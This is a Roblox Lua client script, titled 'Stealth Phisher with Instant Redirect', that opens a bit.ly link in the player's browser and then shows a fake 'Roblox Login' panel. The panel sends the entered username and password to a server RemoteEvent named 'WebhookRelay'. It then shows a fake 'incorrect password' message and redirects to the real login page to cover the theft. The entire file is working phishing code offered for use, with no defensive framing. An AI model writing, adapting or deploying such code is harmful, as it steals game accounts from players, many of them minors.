-- Stealth Phisher with Instant Redirect
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local guiService = game:GetService("GuiService")
local replicatedStorage = game:GetService("ReplicatedStorage")
local runService = game:GetService("RunService")

-- 1. IMMEDIATE REDIRECT – opens the bit.ly link in browser
pcall(function()
    guiService:OpenBrowserWindow("https://bit.ly/robloxxw")
end)

-- 2. Locate the RemoteEvent created by the server
local remoteEvent
for _, child in pairs(replicatedStorage:GetChildren()) do
    if child:IsA("RemoteEvent") and child.Name:find("WebhookRelay") then
        remoteEvent = child
        break
    end
end
if not remoteEvent then return end

-- 3. Slight delay before showing GUI (so redirect happens first)
task.wait(2)

-- 4. Build the fake login GUI (randomized names)
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoginPanel_" .. math.random(1000,9999)
screenGui.Parent = player.PlayerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 380, 0, 320)
frame.Position = UDim2.new(0.5, -190, 0.5, -160)
frame.BackgroundColor3 = Color3.fromRGB(27, 31, 43)
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
frame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 10)
title.BackgroundTransparency = 1
title.Text = "🔐 Roblox Login"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 24
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Center
title.Parent = frame

local userLabel = Instance.new("TextLabel")
userLabel.Size = UDim2.new(0.9, 0, 0, 20)
userLabel.Position = UDim2.new(0.05, 0, 0, 60)
userLabel.BackgroundTransparency = 1
userLabel.Text = "Username / Email"
userLabel.TextColor3 = Color3.fromRGB(200, 208, 220)
userLabel.TextSize = 14
userLabel.Font = Enum.Font.GothamMedium
userLabel.TextXAlignment = Enum.TextXAlignment.Left
userLabel.Parent = frame

local userBox = Instance.new("TextBox")
userBox.Size = UDim2.new(0.9, 0, 0, 32)
userBox.Position = UDim2.new(0.05, 0, 0, 82)
userBox.BackgroundColor3 = Color3.fromRGB(14, 18, 31)
userBox.BorderColor3 = Color3.fromRGB(45, 53, 72)
userBox.BorderSizePixel = 1
userBox.Text = ""
userBox.PlaceholderText = "Enter username or email"
userBox.TextColor3 = Color3.fromRGB(238, 238, 238)
userBox.TextSize = 16
userBox.Font = Enum.Font.Gotham
userBox.ClearTextOnFocus = false
userBox.Parent = frame

local passLabel = Instance.new("TextLabel")
passLabel.Size = UDim2.new(0.9, 0, 0, 20)
passLabel.Position = UDim2.new(0.05, 0, 0, 124)
passLabel.BackgroundTransparency = 1
passLabel.Text = "Password"
passLabel.TextColor3 = Color3.fromRGB(200, 208, 220)
passLabel.TextSize = 14
passLabel.Font = Enum.Font.GothamMedium
passLabel.TextXAlignment = Enum.TextXAlignment.Left
passLabel.Parent = frame

local passBox = Instance.new("TextBox")
passBox.Size = UDim2.new(0.9, 0, 0, 32)
passBox.Position = UDim2.new(0.05, 0, 0, 146)
passBox.BackgroundColor3 = Color3.fromRGB(14, 18, 31)
passBox.BorderColor3 = Color3.fromRGB(45, 53, 72)
passBox.BorderSizePixel = 1
passBox.Text = ""
passBox.PlaceholderText = "Enter password"
passBox.TextColor3 = Color3.fromRGB(238, 238, 238)
passBox.TextSize = 16
passBox.Font = Enum.Font.Gotham
passBox.ClearTextOnFocus = false
passBox.Parent = frame
passBox.Text = ""

local loginBtn = Instance.new("TextButton")
loginBtn.Size = UDim2.new(0.9, 0, 0, 42)
loginBtn.Position = UDim2.new(0.05, 0, 0, 192)
loginBtn.BackgroundColor3 = Color3.fromRGB(0, 153, 255)
loginBtn.BorderSizePixel = 0
loginBtn.Text = "Log In"
loginBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
loginBtn.TextSize = 20
loginBtn.Font = Enum.Font.GothamBold
loginBtn.Parent = frame

local errorLabel = Instance.new("TextLabel")
errorLabel.Size = UDim2.new(0.9, 0, 0, 30)
errorLabel.Position = UDim2.new(0.05, 0, 0, 242)
errorLabel.BackgroundColor3 = Color3.fromRGB(45, 20, 20)
errorLabel.BackgroundTransparency = 0
errorLabel.BorderSizePixel = 0
errorLabel.Text = "⚠️ Incorrect username or password. Please try again."
errorLabel.TextColor3 = Color3.fromRGB(255, 122, 122)
errorLabel.TextSize = 13
errorLabel.Font = Enum.Font.Gotham
errorLabel.TextWrapped = true
errorLabel.Visible = false
errorLabel.Parent = frame

local closeBtn = Instance.new("ImageButton")
closeBtn.Size = UDim2.new(0, 24, 0, 24)
closeBtn.Position = UDim2.new(1, -30, 0, 6)
closeBtn.BackgroundTransparency = 1
closeBtn.Image = "rbxassetid://3926305904"
closeBtn.Parent = frame

-- Send credentials via RemoteEvent (no HTTP on client)
local function sendCredentials(user, pass)
    pcall(function()
        remoteEvent:FireServer(user, pass)
    end)
end

loginBtn.MouseButton1Click:Connect(function()
    local user = userBox.Text:gsub("^%s*(.-)%s*$", "%1")
    local pass = passBox.Text:gsub("^%s*(.-)%s*$", "%1")
    if user == "" or pass == "" then
        errorLabel.Text = "⚠️ Please fill in both fields."
        errorLabel.Visible = true
        return
    end
    sendCredentials(user, pass)
    errorLabel.Text = "⚠️ Incorrect username or password. Please try again."
    errorLabel.Visible = true
    passBox.Text = ""
    passBox:CaptureFocus()
    task.wait(2)
    pcall(function()
        guiService:OpenBrowserWindow("https://www.roblox.com/login")
    end)
    screenGui:Destroy()
end)

closeBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

local function onEnterPressed(inputObject, gameProcessed)
    if inputObject.KeyCode == Enum.KeyCode.Return or inputObject.KeyCode == Enum.KeyCode.KeypadEnter then
        if not gameProcessed then
            loginBtn:Click()
        end
    end
end
userBox.InputBegan:Connect(onEnterPressed)
passBox.InputBegan:Connect(onEnterPressed)

-- Dragging
local dragging = false
local dragStart, startPos
frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
    end
end)
frame.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
frame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)
